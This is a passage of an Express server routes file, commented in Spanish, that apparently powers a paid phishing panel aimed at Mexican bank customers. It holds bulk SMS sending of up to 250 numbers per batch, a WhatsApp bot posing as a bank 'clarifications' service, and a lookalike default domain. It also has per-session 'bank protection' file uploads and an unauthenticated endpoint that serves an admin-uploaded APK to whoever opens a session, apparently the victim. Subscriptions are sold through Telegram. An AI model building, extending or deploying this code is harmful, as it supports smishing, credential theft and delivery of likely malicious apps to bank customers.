          await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
          console.error("Error de conexión con la API de SMS:", errorMsg);

          res.status(500).json({
            success: false,
            message: `Error de conexión con la API de SMS: ${errorMsg}`,
            smsId: smsRecord.id
          });
        }
      } catch (apiError: any) {
        // Si ocurre un error con la API, actualizar el estado del SMS
        await storage.updateSmsStatus(smsRecord.id, 'failed', apiError.message);
        throw apiError;
      }
    } catch (error: any) {
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
  });
  */

  // Obtener historial de SMS enviados
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);

      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener todos los usuarios regulares (para agregar créditos)
  app.get('/api/users/regular', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden ver la lista de usuarios
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden ver la lista de usuarios" });
      }

      const users = await storage.getAllUsers();
      // Filtrar administradores y enviar solo datos básicos
      const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({
        id: user.id,
        username: user.username,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        credits: 0 // El frontend tendrá que cargar los créditos aparte
      }));

      res.json(regularUsers);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Ruta para obtener información de la suscripción del usuario
  app.get("/api/user/subscription", async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ error: "No autenticado" });
      }
      
      const user = req.user;
      const now = new Date();
      const expiresAt = user.expiresAt;
      
      // Determinar si es administrador
      const isAdmin = user.role === UserRole.ADMIN;
      
      // Si es administrador, devolver un conjunto diferente de datos
      if (isAdmin) {
        return res.json({
          isActive: true,
          isPaid: true,
          isAdmin: true,
          expiresAt: null,
          daysRemaining: null,
          hoursRemaining: null,
          message: "Cuenta de administrador con acceso completo"
        });
      }
      
      // Calcular días y horas restantes si hay una fecha de expiración
      let daysRemaining = null;
      let hoursRemaining = null;
      
      if (expiresAt) {
        const diffMs = expiresAt.getTime() - now.getTime();
        const diffHrs = Math.floor(diffMs / (1000 * 60 * 60));
        daysRemaining = Math.floor(diffHrs / 24);
        hoursRemaining = diffHrs % 24;
      }
      
      // Determinar si está activo (es decir, si la suscripción no ha expirado)
      const isActive = !!user.isActive;
      
      // Determinar si está pagado (puede estar inactivo pero con pago pendiente)
      const isPaid = isActive && !!expiresAt && expiresAt > now;
      
      // Crear el mensaje apropiado según el estado
      let message = "";
      
      if (!isActive) {
        message = "Tu cuenta está desactivada. Contacta al administrador para activarla.";
      } else if (!expiresAt) {
        message = "No tienes una suscripción activa. Contacta al administrador para adquirir una.";
      } else if (expiresAt < now) {
        message = "Tu suscripción ha vencido. Contacta al administrador para renovarla.";
      } else if (daysRemaining === 0 && hoursRemaining !== null && hoursRemaining <= 24) {
        message = `Tu suscripción vence pronto. Contacta al administrador en Telegram (@BalonxSistema) para renovar.`;
      } else if (daysRemaining !== null && daysRemaining <= 1) {
        message = `Tu suscripción vence en menos de 2 días. Contacta al administrador para renovar.`;
      } else {
        message = "Suscripción vigente. Puedes usar todos los servicios.";
      }
      
      res.json({
        isActive,
        isPaid,
        isAdmin,
        expiresAt: expiresAt ? expiresAt.toISOString() : null,
        daysRemaining,
        hoursRemaining,
        message
      });
    } catch (error: any) {
      console.error("Error al obtener información de suscripción:", error);
      res.status(500).json({ error: error.message || "Error al obtener información de suscripción" });
    }
  });

  // Ruta para subir archivos de protección bancaria
  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    if (!req.file) {
      return res.status(400).json({ message: "No se subió ningún archivo" });
    }

    try {
      const { sessionId } = req.body;
      if (!sessionId) {
        return res.status(400).json({ message: "Session ID requerido" });
      }

      // Generar URL del archivo
      const fileUrl = `/uploads/${req.file.filename}`;
      const fileSize = `${(req.file.size / 1024 / 1024).toFixed(2)} MB`;

      // Actualizar la sesión con la información del archivo
      await storage.updateSession(sessionId, {
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: fileSize
      });

      console.log(`Archivo subido para sesión ${sessionId}: ${req.file.originalname}`);

      res.json({
        success: true,
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: fileSize
      });
    } catch (error) {
      console.error("Error subiendo archivo:", error);
      res.status(500).json({ message: "Error interno del servidor" });
    }
  });

  // Ruta para eliminar archivo de protección bancaria
  app.delete('/api/remove-protection-file/:sessionId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { sessionId } = req.params;
      
      // Obtener información del archivo actual
      const session = await storage.getSessionById(sessionId);
      if (session && session.fileUrl) {
        // Eliminar archivo del sistema de archivos
        const filePath = path.join(process.cwd(), session.fileUrl);
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      }

      // Limpiar información del archivo en la sesión
      await storage.updateSession(sessionId, {
        fileName: null,
        fileUrl: null,
        fileSize: null
      });

      res.json({ success: true });
    } catch (error) {
      console.error("Error eliminando archivo:", error);
      res.status(500).json({ message: "Error interno del servidor" });
    }
  });

  // === API de configuración del sitio ===
  
  // Obtener la configuración actual del sitio
  app.get('/api/site-config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuarios administradores pueden acceder a la configuración del sitio
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden acceder a la configuración del sitio" });
      }

      const config = await storage.getSiteConfig();
      if (config) {
        res.json({
          baseUrl: config.baseUrl,
          updatedAt: config.updatedAt,
          updatedBy: config.updatedBy
        });
      } else {
        // Si no hay configuración, devolver los valores por defecto
        res.json({
          baseUrl: "https://aclaracionesditales.com",
          updatedAt: null,
          updatedBy: null
        });
      }
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Actualizar la configuración del sitio
  app.post('/api/site-config', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      // Solo usuarios administradores pueden actualizar la configuración del sitio
      if (user.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración del sitio" });
      }

      // Validar y normalizar la URL usando el esquema robusto  
      const data = insertSiteConfigSchema.parse({
        baseUrl: req.body.baseUrl,
        updatedBy: user.username
      });

      const config = await storage.updateSiteConfig(data);

      res.json({
        success: true,
        baseUrl: config.baseUrl,
        updatedAt: config.updatedAt,
        updatedBy: config.updatedBy,
        message: "Configuración del sitio actualizada correctamente"
      });
    } catch (error: any) {
      // Manejar errores de validación de Zod específicamente
      if (error.name === 'ZodError') {
        const validationError = error.errors[0];
        return res.status(400).json({ 
          message: `Error de validación: ${validationError.message}`,
          field: validationError.path[0]
        });
      }
      
      res.status(500).json({ message: error.message });
    }
  });

  // === RUTAS DE SMS ===
  
  // Obtener configuración de SMS
  app.get('/api/sms/config', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const config = await storage.getSmsConfig();
      res.json({ success: true, config });
    } catch (error: any) {
      console.error('Error obteniendo configuración SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Actualizar configuración de SMS
  app.post('/api/sms/config', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username, password, apiUrl } = req.body;
      
      const configData: InsertSmsConfig = {
        username: username || null,
        password: password || null,
        apiUrl: apiUrl || "https://www.sofmex.com/api/sms/v3/asignacion",
        isActive: true,
        updatedBy: user.username
      };

      const config = await storage.updateSmsConfig(configData);
      res.json({ success: true, config });
    } catch (error: any) {
      console.error('Error actualizando configuración SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Obtener créditos de un usuario
  app.get('/api/sms/credits/:userId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const userId = parseInt(req.params.userId);
      const credits = await storage.getUserSmsCredits(userId);
      res.json({ success: true, credits });
    } catch (error: any) {
      console.error('Error obteniendo créditos SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Agregar créditos a un usuario
  app.post('/api/sms/credits/add', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { userId, amount } = req.body;
      
      console.log('Datos recibidos para agregar créditos:', { userId, amount, userIdType: typeof userId, amountType: typeof amount });
      
      if (!userId || !amount || amount <= 0) {
        return res.status(400).json({ 
          success: false, 
          message: "ID de usuario y cantidad válida son requeridos" 
        });
      }

      const parsedUserId = parseInt(userId);
      const parsedAmount = parseInt(amount);
      
      console.log('Datos parseados:', { parsedUserId, parsedAmount });
      
      if (isNaN(parsedUserId) || isNaN(parsedAmount)) {
        return res.status(400).json({ 
          success: false, 
          message: "ID de usuario y cantidad deben ser números válidos" 
        });
      }

      const credits = await storage.addSmsCredits(parsedUserId, parsedAmount);

      res.json({ success: true, credits });
    } catch (error: any) {
      console.error('Error agregando créditos SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Obtener historial de SMS de un usuario
  app.get('/api/sms/history/:userId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const userId = parseInt(req.params.userId);
      const history = await storage.getUserSmsHistory(userId);
      res.json({ success: true, history });
    } catch (error: any) {
      console.error('Error obteniendo historial SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Enviar SMS con selección de ruta (Short Code 1 crédito, Long Code 0.5 créditos)
  app.post('/api/sms/send', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    // Permitir tanto administradores como usuarios normales
    if (user.role !== UserRole.ADMIN && user.role !== UserRole.USER) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { phoneNumbers, message, prefix = '+52', routeType = 'long_code' } = req.body;
      
      console.log('Datos recibidos para SMS:', { 
        phoneNumbers, 
        messageLength: message?.length, 
        prefix,
        routeType
      });

      // Validar que se proporcione número de teléfono
      if (!phoneNumbers || phoneNumbers.trim() === '') {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }

      // Validar el mensaje
      const messageValidation = validateSMSMessage(message);
      if (!messageValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: messageValidation.error 
        });
      }

      // Validar tipo de ruta
      const selectedRoute = routeType as SmsRouteType;
      if (!Object.values(SmsRouteType).includes(selectedRoute)) {
        return res.status(400).json({ 
          success: false, 
          message: "Tipo de ruta inválido" 
        });
      }

      // Procesar y validar números de teléfono
      const processedNumbers = parsePhoneNumbers(phoneNumbers, prefix);
      
      if (processedNumbers.length === 0) {
        return res.status(400).json({ 
          success: false, 
          message: "No se encontraron números de teléfono válidos" 
        });
      }

      if (processedNumbers.length > 250) {
        return res.status(400).json({ 
          success: false, 
          message: "Máximo 250 números por envío" 
        });
      }

      // Calcular créditos requeridos según la ruta
      const requiredCredits = calculateCreditCost(processedNumbers.length, selectedRoute);
      
      // Verificar créditos solo para usuarios regulares (no administradores)
      const userCredits = await storage.getUserSmsCredits(user.id);

      if (user.role !== UserRole.ADMIN && userCredits < requiredCredits) {
        return res.status(400).json({ 
          success: false, 
          message: `Créditos insuficientes. Tienes ${userCredits}, necesitas ${requiredCredits} (${selectedRoute === SmsRouteType.LONG_CODE ? '0.5' : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? '1' : '1'} crédito por SMS)` 
        });
      }

      console.log(`📱 Enviando ${processedNumbers.length} SMS vía ${selectedRoute} por usuario ${user.username} (${requiredCredits} créditos)`);

      // Enviar SMS usando la ruta seleccionada
      const smsResult = await sendSMSWithRoute(processedNumbers, message, selectedRoute);
      
      let successCount = 0;
      let failedCount = 0;
      let creditsUsed = 0;

      if (smsResult.success) {
        successCount = processedNumbers.length;
        // Descontar créditos solo si el envío fue exitoso y el usuario no es admin
        if (user.role !== UserRole.ADMIN) {
          const creditDeducted = await storage.useSmsCredits(user.id, requiredCredits);
          if (creditDeducted) {
            creditsUsed = requiredCredits;
            console.log(`✅ SMS enviados exitosamente vía ${selectedRoute}. Créditos descontados: ${requiredCredits}`);
          } else {
            console.log(`⚠️ SMS enviados pero no se pudieron descontar créditos`);
          }
        } else {
          console.log(`✅ SMS enviados exitosamente por administrador vía ${selectedRoute}. No se descontaron créditos.`);
        }
      } else {
        failedCount = processedNumbers.length;
        console.log(`❌ Error enviando SMS vía ${selectedRoute}: ${smsResult.error}`);
      }

      // Guardar historial de envíos con información de ruta y costo
      const historyPromises = processedNumbers.map(async (phoneNumber) => {
        return storage.addSmsToHistory({
          userId: user.id,
          phoneNumber,
          message,
          sessionId: req.body.sessionId || null,
          routeType: selectedRoute,
          creditCost: (selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? 1 : 1).toString()
        });
      });

      await Promise.all(historyPromises);

      // Obtener créditos actualizados
      const finalCredits = await storage.getUserSmsCredits(user.id);

      res.json({
        success: true,
        data: {
          sent: successCount,
          failed: failedCount,
          total: processedNumbers.length,
          routeType: selectedRoute,
          routeCostPerSMS: selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : selectedRoute === SmsRouteType.SHORT_CODE || selectedRoute === SmsRouteType.PREMIUM ? 1 : 1,
          creditsUsed: creditsUsed,
          remainingCredits: finalCredits,
          smsResponse: smsResult.data || null,
          error: smsResult.error || null
        }
      });

    } catch (error: any) {
      console.error('Error enviando SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Rutas del bot de Telegram y 2FA
  app.post('/api/telegram/send-verification', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { sendVerificationCode } = await import('./telegramBot');
      const user = req.user;
      
      const result = await sendVerificationCode(user.id, user.username);
      
      if (result.success) {
        res.json({ success: true, message: 'Código de verificación enviado' });
      } else {
        res.status(400).json({ success: false, message: result.error });
      }
    } catch (error: any) {
      console.error('Error enviando código 2FA:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/telegram/verify-code', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { verifyCode } = await import('./telegramBot');
      const { code } = req.body;
      const user = req.user;
      
      if (!code) {
        return res.status(400).json({ success: false, message: 'Código requerido' });
      }

      const result = await verifyCode(user.id, code);
      
      if (result.success) {
        res.json({ success: true, message: 'Código verificado correctamente' });
      } else {
        res.status(400).json({ success: false, message: result.error });
      }
    } catch (error: any) {
      console.error('Error verificando código 2FA:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/telegram/send-admin-message', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { sendAdminMessage, sendBroadcastMessage } = await import('./telegramBot');
      const { message, userChatId, isBroadcast } = req.body;
      
      if (!message) {
        return res.status(400).json({ success: false, message: 'Mensaje requerido' });
      }

      let result;
      if (isBroadcast) {
        result = await sendBroadcastMessage(message, user.username);
        res.json({ 
          success: result.success, 
          message: `Mensaje enviado a ${result.sent} usuarios, ${result.failed} fallidos`,
          sent: result.sent,
          failed: result.failed,
          errors: result.errors
        });
      } else if (userChatId) {
        result = await sendAdminMessage(userChatId, message, user.username);
        if (result.success) {
          res.json({ success: true, message: 'Mensaje enviado correctamente' });
        } else {
          res.status(400).json({ success: false, message: result.error });
        }
      } else {
        res.status(400).json({ success: false, message: 'Chat ID o broadcast requerido' });
      }
    } catch (error: any) {
      console.error('Error enviando mensaje de administrador:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Enviar mensaje directo a un usuario específico por su username
  app.post('/api/telegram/send-direct-message', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { sendAdminMessage } = await import('./telegramBot');
      const { message, username } = req.body;
      
      if (!message) {
        return res.status(400).json({ success: false, message: 'Mensaje requerido' });
      }

      if (!username) {
        return res.status(400).json({ success: false, message: 'Username requerido' });
      }

      // Buscar el usuario por username para obtener su Chat ID
      const targetUser = await storage.getUserByUsername(username);
      if (!targetUser) {
        return res.status(404).json({ success: false, message: 'Usuario no encontrado' });
      }

      if (!targetUser.telegramChatId) {
        return res.status(400).json({ success: false, message: 'El usuario no tiene Chat ID configurado' });
      }

      const result = await sendAdminMessage(targetUser.telegramChatId, message, user.username);
      
      if (result.success) {
        res.json({ 
          success: true, 
          message: `Mensaje enviado a ${username} correctamente` 
        });
      } else {
        res.status(400).json({ success: false, message: result.error });
      }
    } catch (error: any) {
      console.error('Error enviando mensaje directo:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Endpoint para subir archivos APK
  app.post('/api/upload-apk', upload.single('apkFile'), async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      if (!req.file) {
        return res.status(400).json({ message: "No se proporcionó archivo APK" });
      }

      // Verificar que sea un archivo APK
      if (!req.file.originalname.toLowerCase().endsWith('.apk')) {
        return res.status(400).json({ message: "El archivo debe ser un APK (.apk)" });
      }

      // Generar URL del archivo APK
      const apkFileUrl = `/uploads/${req.file.filename}`;
      
      console.log(`APK ${req.file.originalname} subido por administrador ${user.username}`);

      res.json({
        success: true,
        fileName: req.file.originalname,
        fileUrl: apkFileUrl,
        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'
      });
    } catch (error) {
      console.error("Error uploading APK:", error);
      res.status(500).json({ message: "Error al subir APK" });
    }
  });

  // Endpoint para asignar APK a un usuario
  app.post('/api/assign-apk', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { userId, apkFileName, apkFileUrl } = req.body;

      if (!userId) {
        return res.status(400).json({ message: "UserId es requerido" });
      }

      // Verificar que el usuario existe
      const targetUser = await storage.getUserById(parseInt(userId));
      if (!targetUser) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Asignar o remover APK del usuario
      await storage.updateUser(parseInt(userId), {
        apkFileName: apkFileName || null,
        apkFileUrl: apkFileUrl || null
      });

      if (apkFileName && apkFileUrl) {
        console.log(`APK ${apkFileName} asignado al usuario ${targetUser.username} por ${user.username}`);
        res.json({
          success: true,
          message: `APK asignado correctamente a ${targetUser.username}`
        });
      } else {
        console.log(`APK removido del usuario ${targetUser.username} por ${user.username}`);
        res.json({
          success: true,
          message: `APK removido correctamente de ${targetUser.username}`
        });
      }
    } catch (error) {
      console.error("Error assigning APK:", error);
      res.status(500).json({ message: "Error al asignar APK" });
    }
  });

  // Endpoint para obtener el APK asignado al usuario de una sesión
  app.get('/api/get-user-apk/:sessionId', async (req, res) => {
    try {
      const { sessionId } = req.params;

      // Obtener la sesión
      const session = await storage.getSessionById(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Sesión no encontrada" });
      }

      // Obtener el usuario que creó la sesión
      if (!session.createdBy) {
        return res.status(404).json({ message: "No hay usuario asociado a la sesión" });
      }

      const user = await storage.getUserByUsername(session.createdBy);
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Verificar si tiene APK asignado
      if (!user.apkFileName || !user.apkFileUrl) {
        return res.status(404).json({ message: "No hay APK asignado a este usuario" });
      }

      res.json({
        success: true,
        apkFileName: user.apkFileName,
        apkFileUrl: user.apkFileUrl,
        userName: user.username
      });
    } catch (error) {
      console.error("Error getting user APK:", error);
      res.status(500).json({ message: "Error al obtener APK del usuario" });
    }
  });

  // Endpoint para obtener lista de usuarios para asignación de APK
  app.get('/api/users-for-apk', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const users = await storage.getAllUsers();
      
      // Filtrar solo usuarios activos y mapear datos relevantes
      const userList = users
        .filter(u => u.isActive && u.role === UserRole.USER)
        .map(u => ({
          id: u.id,
          username: u.username,
          apkFileName: u.apkFileName,
          apkFileUrl: u.apkFileUrl,
          hasApk: !!u.apkFileName
        }));

      res.json(userList);
    } catch (error) {
      console.error("Error getting users for APK:", error);
      res.status(500).json({ message: "Error al obtener usuarios" });
    }
  });

  // Ruta temporal para probar notificaciones de activación
  app.post("/api/test-activation-notification", async (req, res) => {
    try {
      
      // Usuario de prueba con Chat ID del admin configurado
      const testUserData = {
        username: "usuario_prueba",
        telegramChatId: process.env.ADMIN_CHAT_ID || "",
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 1 día
        allowedBanks: "banamex,bbva,banorte"
      };

      const result = await sendAccountActivationNotification(testUserData);
      
      if (result.success) {
        res.json({ 
          success: true, 
          message: "Notificación de activación enviada correctamente",
          userData: testUserData
        });
      } else {
        res.status(400).json({ 
          success: false, 
          error: result.error 
        });
      }
    } catch (error: any) {
      console.error("Error en prueba de notificación:", error);
      res.status(500).json({ 
        success: false, 
        error: error.message 
      });
    }
  });

  // Rutas de configuración del sistema (precio de suscripción)
  app.get("/api/system-config", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    if (req.user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const config = await storage.getSystemConfig();
      res.json(config || { subscriptionPrice: '0' });
    } catch (error) {
      console.error("Error getting system config:", error);
      res.status(500).json({ message: "Error al obtener configuración" });
    }
  });

  app.post("/api/system-config", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    if (req.user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { subscriptionPrice } = req.body;
      
      if (!subscriptionPrice || isNaN(parseFloat(subscriptionPrice))) {
        return res.status(400).json({ message: "Precio de suscripción inválido" });
      }

      const config = await storage.updateSystemConfig({
        subscriptionPrice: subscriptionPrice.toString(),
        updatedBy: req.user.id
      });

      res.json(config);
    } catch (error) {
      console.error("Error updating system config:", error);
      res.status(500).json({ message: "Error al actualizar configuración" });
    }
  });

  // Ruta para actualizar precio personalizado de usuario
  app.patch("/api/users/:userId/custom-price", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    if (req.user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      // Validar parámetro userId
      const userIdSchema = z.object({
        userId: z.string().regex(/^\d+$/).transform(Number)
      });
      
      const { userId } = userIdSchema.parse({ userId: req.params.userId });
      
      // Validar el cuerpo con Zod
      const customPriceSchema = z.object({
        customPrice: z.union([
          z.string().regex(/^\d+(\.\d{1,2})?$/, {
            message: "El precio debe tener formato válido (ej: 150 o 150.50)"
          }).refine(val => parseFloat(val) > 0, {
            message: "El precio debe ser un número positivo"
          }),
          z.null()
        ])
      });

      const validatedData = customPriceSchema.parse(req.body);
      
      // Normalizar el precio a 2 decimales si no es null
      let priceValue: string | null = null;
      if (validatedData.customPrice !== null) {
        const numericPrice = parseFloat(validatedData.customPrice);
        priceValue = numericPrice.toFixed(2);
      }

      await storage.updateUser(userId, {
        customPrice: priceValue
      });

      const updatedUser = await storage.getUserById(userId);
      res.json(updatedUser);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: error.errors[0].message });
      }
      console.error("Error updating user custom price:", error);
      res.status(500).json({ message: "Error al actualizar precio personalizado" });
    }
  });

  // Rutas de pagos
  app.get("/api/payments/pending", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    if (req.user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const payments = await storage.getPendingPayments();
      res.json(payments);
    } catch (error) {
      console.error("Error getting pending payments:", error);
      res.status(500).json({ message: "Error al obtener pagos pendientes" });
    }
  });

  app.get("/api/payments/user/:userId", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const userId = parseInt(req.params.userId);
    
    // Los usuarios pueden ver sus propios pagos, los admins pueden ver todos
    if (req.user.role !== UserRole.ADMIN && req.user.id !== userId) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const payments = await storage.getUserPayments(userId);
      res.json(payments);
    } catch (error) {
      console.error("Error getting user payments:", error);
      res.status(500).json({ message: "Error al obtener pagos del usuario" });
    }
  });

  // Crear pago pendiente para un usuario (usa precio personalizado si existe)
  app.post("/api/payments/create-pending", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    if (req.user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      // Validar el cuerpo con Zod
      const createPaymentSchema = z.object({
        userId: z.number().int().positive()
      });

      const validatedData = createPaymentSchema.parse(req.body);

      // Obtener el usuario para verificar si tiene precio personalizado
      const user = await storage.getUserById(validatedData.userId);
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Determinar el precio a usar
      let amount: string;
      if (user.customPrice) {
        // Usar precio personalizado del usuario (validar y normalizar)
        const customPriceNum = parseFloat(user.customPrice);
        if (!isFinite(customPriceNum) || customPriceNum <= 0) {
          return res.status(400).json({ 
            message: "El precio personalizado del usuario es inválido. Actualícelo antes de crear el pago." 
          });
        }
        amount = customPriceNum.toFixed(2);
      } else {
        // Usar precio del sistema (validar y normalizar)
        const systemConfig = await storage.getSystemConfig();
        const systemPriceNum = systemConfig?.subscriptionPrice ? parseFloat(systemConfig.subscriptionPrice) : NaN;
        
        if (!isFinite(systemPriceNum) || systemPriceNum <= 0) {
          return res.status(400).json({ 
            message: "No hay precio del sistema válido configurado. Configure el precio del sistema o un precio personalizado para este usuario." 
          });
        }
        amount = systemPriceNum.toFixed(2);
      }

      // Generar código de referencia único para el pago
      const { generatePaymentReferenceCode } = await import('./telegramBot');
      const referenceCode = generatePaymentReferenceCode();
      
      // Expira en 24 horas
      const expiresAt = new Date();
      expiresAt.setHours(expiresAt.getHours() + 24);

      // Crear el pago pendiente
      const payment = await storage.createPayment({
        userId: user.id,
        amount,
        referenceCode,
        status: 'pending',
        expiresAt,
        verificationAttempts: 0
      });

      res.json(payment);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: error.errors[0].message });
      }
      console.error("Error creating pending payment:", error);
      res.status(500).json({ message: "Error al crear pago pendiente" });
    }
  });

  // ==================== WHATSAPP BOT ROUTES ====================
  
  // Obtener configuración de WhatsApp
  app.get("/api/whatsapp/config", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const config = await storage.getWhatsAppConfig(req.user.id);
      
      // Si no existe configuración, crear una por defecto
      if (!config) {
        const defaultConfig = await storage.createWhatsAppConfig({
          userId: req.user.id,
          phoneNumber: '',
          welcomeMessage: 'Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.\n\nPor favor selecciona una opción:',
          isConnected: false,
          qrCode: null
        });
        return res.json(defaultConfig);
      }
      
      res.json(config);
    } catch (error) {
      console.error("Error obteniendo configuración de WhatsApp:", error);
      res.status(500).json({ message: "Error al obtener configuración" });
    }
  });

  // Iniciar bot de WhatsApp y obtener QR
  app.post("/api/whatsapp/start", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      // Usar el gestor de bots para iniciar el bot de este usuario
      await whatsappBotManager.startBot(req.user.id, storage);

      res.json({ success: true, message: "Bot iniciado, escanea el código QR" });
    } catch (error) {
      console.error("Error iniciando bot de WhatsApp:", error);
